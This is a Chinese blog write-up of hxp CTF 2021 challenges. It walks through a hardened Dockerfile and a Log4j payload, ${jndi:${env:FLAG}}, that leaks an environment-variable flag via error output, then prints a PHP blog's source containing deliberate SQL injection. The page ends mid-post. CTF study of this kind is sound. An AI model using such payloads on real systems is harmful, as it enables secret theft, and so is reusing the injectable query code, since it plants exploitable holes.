<!DOCTYPE html>
<html lang="zh-Hans">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.0.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"blog.z3ratu1.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
  </script>

  <meta name="description" content="hxpctf2021复现还是蹭的科恩的车，虽然菜狗很努力的看了一天半，但真的菜，不会就是不会，所以仍然内容主题是复现（以及hxp这把所有web的dockerfile都非常复杂，进行了究极权限控制）（这把在misc里面有一个log4j的题） Log 4 sanity checklog4j题，签到难度。给了附件，class直接反汇编出来，就是nc上去输一个字符串然后直接log4j打印一下触发 究极do">
<meta property="og:type" content="article">
<meta property="og:title" content="hxpctf2021复现">
<meta property="og:url" content="https://blog.z3ratu1.cn/hxpctf2021%E5%A4%8D%E7%8E%B0.html">
<meta property="og:site_name" content="Z3ratu1&#39;s blog">
<meta property="og:description" content="hxpctf2021复现还是蹭的科恩的车，虽然菜狗很努力的看了一天半，但真的菜，不会就是不会，所以仍然内容主题是复现（以及hxp这把所有web的dockerfile都非常复杂，进行了究极权限控制）（这把在misc里面有一个log4j的题） Log 4 sanity checklog4j题，签到难度。给了附件，class直接反汇编出来，就是nc上去输一个字符串然后直接log4j打印一下触发 究极do">
<meta property="og:locale">
<meta property="article:published_time" content="2021-12-20T05:34:19.000Z">
<meta property="article:modified_time" content="2022-01-06T10:11:33.804Z">
<meta property="article:author" content="Z3ratu1">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://blog.z3ratu1.cn/hxpctf2021%E5%A4%8D%E7%8E%B0.html">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-Hans'
  };
</script>

  <title>hxpctf2021复现 | Z3ratu1's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Z3ratu1's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">Welcome</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-links">

    <a href="/links/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>

  </li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
  </div>
  <span class="popup-btn-close">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div id="search-result">
  <div id="no-result">
    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
  </div>
</div>

    </div>
  </div>

</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/Z3ratu1" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="external nofollow noopener noreferrer" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
    <link itemprop="mainEntityOfPage" href="https://blog.z3ratu1.cn/hxpctf2021%E5%A4%8D%E7%8E%B0.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://thirdqq.qlogo.cn/g?b=sdk&k=LSKHut5Wmfic1emlMT4FpuA&kti=ZMCGFwAAAAI&s=640&t=1673848139">
      <meta itemprop="name" content="Z3ratu1">
      <meta itemprop="description" content="与其感慨路难行，不如现在出发">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Z3ratu1's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          hxpctf2021复现
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-12-20 13:34:19" itemprop="dateCreated datePublished" datetime="2021-12-20T13:34:19+08:00">2021-12-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-01-06 18:11:33" itemprop="dateModified" datetime="2022-01-06T18:11:33+08:00">2022-01-06</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" itemprop="url" rel="index"><span itemprop="name">刷题记录</span></a>
                </span>
            </span>

          
            <span id="/hxpctf2021%E5%A4%8D%E7%8E%B0.html" class="post-meta-item leancloud_visitors" data-flag-title="hxpctf2021复现" title="阅读次数">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">阅读次数：</span>
              <span class="leancloud-visitors-count"></span>
            </span>
  
  <span class="post-meta-item">
    
      <span class="post-meta-item-icon">
        <i class="far fa-comment"></i>
      </span>
      <span class="post-meta-item-text">Valine：</span>
    
    <a title="valine" href="/hxpctf2021%E5%A4%8D%E7%8E%B0.html#valine-comments" itemprop="discussionUrl">
      <span class="post-comments-count valine-comment-count" data-xid="/hxpctf2021%E5%A4%8D%E7%8E%B0.html" itemprop="commentCount"></span>
    </a>
  </span>
  
  

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="hxpctf2021复现"><a href="#hxpctf2021复现" class="headerlink" title="hxpctf2021复现"></a>hxpctf2021复现</h1><p>还是蹭的科恩的车，虽然菜狗很努力的看了一天半，但真的菜，不会就是不会，所以仍然内容主题是复现（以及hxp这把所有web的dockerfile都非常复杂，进行了究极权限控制）<br>（这把在misc里面有一个log4j的题）</p>
<h2 id="Log-4-sanity-check"><a href="#Log-4-sanity-check" class="headerlink" title="Log 4 sanity check"></a>Log 4 sanity check</h2><p>log4j题，签到难度。给了附件，class直接反汇编出来，就是nc上去输一个字符串然后直接log4j打印一下触发</p>
<h3 id="究极dockerfile"><a href="#究极dockerfile" class="headerlink" title="究极dockerfile"></a>究极dockerfile</h3><p>给了一个超长dockerfile。。。hxp的dockerfile基本上都这么长，进行了各种究极的权限控制，操作也都类似</p>
<pre class=" language-dockerfile"><code class="language-dockerfile"># Running locally:
# 1) echo 'hxp{FLAG}' > flag.txt
# 2) docker build -t log4sanitycheck .
# 3) docker run -p 1337:1024 --rm --cap-add=SYS_ADMIN --security-opt apparmor=unconfined -it log4sanitycheck

FROM debian:bullseye

# Install deps.
RUN apt-get update && \
    DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \
        default-jre-headless && \
    rm -rf /var/lib/apt/lists/

# Set up the flag
COPY flag.txt docker-stuff/readflag /
RUN chown root:1337 /flag.txt /readflag && \
    chmod 040 /flag.txt && \
    chmod 2555 /readflag

# Set up ynetd and the launcher
RUN useradd --create-home --shell /bin/bash ctf
WORKDIR /home/ctf
COPY Vuln.class run.sh *.xml *.jar /home/ctf/
COPY ynetd /sbin/
RUN chmod 555 /home/ctf && \
    chown -R root:root /home/ctf && \
    chmod -R 000 /home/ctf/* && \
    chmod 500 /sbin/ynetd && \
    chmod 005 /home/ctf/run.sh && \
    chmod 004 /home/ctf/*.class /home/ctf/*.jar /home/ctf/*.xml

# We're paranoid
RUN find / -ignore_readdir_race -type f \( -perm -4000 -o -perm -2000 \) -not -wholename /readflag -delete
USER ctf
RUN (find --version && id --version && sed --version && grep --version) > /dev/null
RUN ! find / -writable -or -user $(id -un) -or -group $(id -Gn|sed -e 's/ / -or -group /g') 2> /dev/null | grep -Ev -m 1 '^(/dev/|/run/|/proc/|/sys/|/tmp|/var/tmp|/var/lock|/var/mail|/var/spool/mail)'

# Run
USER root
EXPOSE 1024
CMD ynetd -np y -lm -1 -lpid 64 -lt 10 -t 30 "FLAG='$(cat /flag.txt)' /home/ctf/run.sh"
</code></pre>
<p>最开始的下载东西还比较正常，然后逐渐变得离谱。<br>上来就给flag040，再配合一个setUID的readflag，之后各种限制权限，能给0的都给0<br><code>We&#39;re paranoid</code>下面那段代码大概是在把readflag以外的所有特权程序全都删掉，然后检查一下find，id，sed，grep这几个命令是不是存在<br>grep -E选项启用正则，-v选项只显示不匹配项目，-m选项为匹配行数，大概就是只匹配不是这些目录下的属于当前用户或当前用户可写的文件（暂时没看出来那个感叹号有什么用），但-m 1只匹配一行，不知道，如果存在多个这样的文件而第一行在规定的<code>/dev/|/run/|/proc/...</code>这些目录里面，不就会显示匹配不上了？</p>
<h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p>要打到命令执行，而log4j要打到命令执行用的是jndi注入，要么远古版本jdk直接reference打通，要么tomcat版本特殊用对应factory打，要么本地自带CC之类的一套链。显然这里一个条件的不符合<br><code>CMD ynetd -np y -lm -1 -lpid 64 -lt 10 -t 30 &quot;FLAG=&#39;$(cat /flag.txt)&#39; /home/ctf/run.sh&quot;</code><br>但是看到最后RUN运行的这句，是以root直接起了这个ynetd，虽然不知道这个是什么，但是有一句<code>FLAG=&#39;$(cat /flag.txt)</code>，把flag塞进了环境变量。<br>log4j在爆出漏洞的时候因为通杀一个dnslog验证，所以大家也就想出了dnslog外带的方法，可以看看jdk version之类的，这里同样也可以外带flag</p>
<p>一开始因为是要自己搭一个dnslog的，后来发现直接报错也会回显，直接<br><code>$&#123;jndi:$&#123;env:FLAG&#125;&#125;</code>即可在报错中拿到flag</p>
<p><code>hxp&#123;Phew, I am glad I code everything in PHP anyhow :) - :( :( :(&#125;</code></p>
<p>以及他们的flag都长的一逼</p>
<h2 id="shitty-blog"><a href="#shitty-blog" class="headerlink" title="shitty blog"></a>shitty blog</h2><p>我觉得还挺难的 :(</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token comment" spellcheck="true">// TODO: fully implement multi-user / guest feature :(</span>

<span class="token variable">$secret</span> <span class="token operator">=</span> <span class="token string">'SECRET_PLACEHOLDER'</span><span class="token punctuation">;</span>
<span class="token variable">$salt</span> <span class="token operator">=</span> <span class="token string">'$6$'</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'$'</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">random_int</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">PHP_INT_MAX</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$mac</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">crypt</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token variable">$session</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string">'session'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token function">crypt</span><span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$salt</span><span class="token punctuation">.</span><span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$mac</span> <span class="token operator">=</span> <span class="token variable">$session</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'session'</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">'|'</span><span class="token punctuation">.</span><span class="token variable">$mac</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">'./data/'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$salt</span><span class="token punctuation">.</span><span class="token string">'|'</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">'|'</span><span class="token punctuation">.</span><span class="token variable">$mac</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$db</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string">'sqlite:'</span><span class="token punctuation">.</span><span class="token function">realpath</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'/blog.sqlite3'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ATTR_ERRMODE</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ERRMODE_EXCEPTION</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">ATTR_EMULATE_PREPARES</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$schema</span> <span class="token operator">=</span> "
    <span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token keyword">IF</span> <span class="token constant">NOT</span> <span class="token constant">EXISTS</span> <span class="token function">user</span> <span class="token punctuation">(</span>id <span class="token constant">INTEGER</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span><span class="token punctuation">,</span> name <span class="token function">VARCHAR</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token keyword">IF</span> <span class="token constant">NOT</span> <span class="token constant">EXISTS</span> <span class="token function">entry</span> <span class="token punctuation">(</span>id <span class="token constant">INTEGER</span> <span class="token constant">PRIMARY</span> <span class="token constant">KEY</span> <span class="token constant">AUTOINCREMENT</span><span class="token punctuation">,</span> user_id <span class="token constant">INTEGER</span><span class="token punctuation">,</span> content <span class="token constant">TEXT</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token constant">INSERT</span> <span class="token keyword">OR</span> <span class="token constant">IGNORE</span> <span class="token constant">INTO</span> <span class="token function">user</span> <span class="token punctuation">(</span>id<span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token function">VALUES</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'System'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token constant">INSERT</span> <span class="token keyword">OR</span> <span class="token constant">IGNORE</span> <span class="token constant">INTO</span> <span class="token function">entry</span> <span class="token punctuation">(</span>id<span class="token punctuation">,</span> user_id<span class="token punctuation">,</span> content<span class="token punctuation">)</span> <span class="token function">VALUES</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'Welcome to your new blog - 🚩🚩🚩 ʕ•́ᴥ•̀ʔっ🤎 🚩🚩🚩'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
"<span class="token punctuation">;</span>
<span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$schema</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function">get_entries</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token variable">$sth</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">'SELECT id, user_id, content FROM entry ORDER BY id DESC'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
     <span class="token keyword">return</span> <span class="token variable">$sth</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">fetchAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$user_id</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> string <span class="token punctuation">{</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string">"SELECT name FROM user WHERE id = {$user_id}"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$user</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token variable">$user</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token string">'me'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">insert_entry</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$user_id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$sth</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token string">'INSERT INTO entry (content, user_id) VALUES (?, ?)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$sth</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token variable">$content</span><span class="token punctuation">,</span> <span class="token variable">$user_id</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">delete_entry</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$entry_id</span><span class="token punctuation">,</span> <span class="token variable">$user_id</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"DELETE from entry WHERE {$user_id} &lt;> 0 AND id = {$entry_id}"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">insert_entry</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$entries</span> <span class="token operator">=</span> <span class="token function">get_entries</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'delete'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$entries</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$entry</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'delete'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
            <span class="token function">delete_entry</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Location: /'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    exit<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$entries</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$entry</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$entries</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'user'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token variable">$db</span><span class="token punctuation">,</span> <span class="token variable">$entry</span><span class="token punctuation">[</span><span class="token string">'user_id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token delimiter">?></span>
<span class="token markup"><span class="token doctype">&lt;!doctype html></span></span>
